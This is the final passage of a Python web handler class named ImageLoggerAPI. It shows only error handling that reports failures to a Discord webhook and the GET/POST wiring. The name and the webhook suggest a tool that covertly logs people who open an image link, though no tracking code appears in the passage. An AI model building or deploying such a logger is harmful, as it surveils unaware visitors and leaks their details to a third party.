</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
